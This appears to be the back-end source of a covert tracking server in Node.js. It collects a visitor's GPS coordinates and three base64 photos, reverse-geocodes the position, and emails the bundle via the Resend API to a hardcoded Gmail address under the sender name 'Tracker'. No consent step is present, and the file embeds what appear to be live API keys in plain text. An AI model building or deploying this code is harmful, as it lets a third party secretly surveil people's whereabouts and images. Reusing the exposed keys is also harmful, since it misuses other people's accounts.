const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const OPENCAGE_API_KEY = 'ab640572ab1d4dabb262814dd5e9e85c';
const RESEND_API_KEY = 're_B3PbjSbC_EQCvehvC37bWTHf4F3KdP2Mj';

app.use(express.static(path.join(__dirname)));
app.use(express.json({ limit: '10mb' }));

let photoBuffer = [];
let userLocation = null;

// Location handler (save for later use)
app.post('/api/location', async (req, res) => {
  const { latitude, longitude } = req.body;

  if (!latitude || !longitude) {
    return res.status(400).send('Missing coordinates.');
  }

  try {
    const geoURL = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OPENCAGE_API_KEY}`;
    const response = await axios.get(geoURL);
    const location = response.data.results[0]?.formatted || 'Unknown location';

    userLocation = {
      location,
      coordinates: `(${latitude}, ${longitude})`
    };

    res.send('Location saved.');
    maybeSendEmail(); // Try sending if photos are ready
  } catch (err) {
    console.error(err);
    res.status(500).send('Error fetching location.');
  }
});

// Photo handler (store for later use)
app.post('/api/photo', (req, res) => {
  const { image } = req.body;

  if (!image || !image.startsWith('data:image')) {
    return res.status(400).send('Invalid or missing image data.');
  }

  const base64Data = image.replace(/^data:image\/\w+;base64,/, '');

  photoBuffer.push({
    filename: `photo-${Date.now()}.jpg`,
    content: base64Data,
    contentType: 'image/jpeg'
  });

  res.send(`Photo ${photoBuffer.length} stored.`);

  maybeSendEmail(); // Try sending if all data is ready
});

// Check if we have everything to send the email
async function maybeSendEmail() {
  if (userLocation && photoBuffer.length === 3) {
    try {
      const emailText = `User's Location:\n${userLocation.location}\nCoordinates: ${userLocation.coordinates}`;

      await axios.post('https://api.resend.com/emails', {
        from: 'Tracker <onboarding@resend.dev>',
        to: 'aaloneswk@gmail.com',
        subject: 'User Location with Photos',
        text: emailText,
        attachments: photoBuffer
      }, {
        headers: {
          'Authorization': `Bearer ${RESEND_API_KEY}`,
          'Content-Type': 'application/json'
        }
      });

      console.log('Email sent with all photos and location.');

      // Reset for next session
      photoBuffer = [];
      userLocation = null;
    } catch (err) {
      console.error('Error sending final email:', err);
    }
  }
}

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});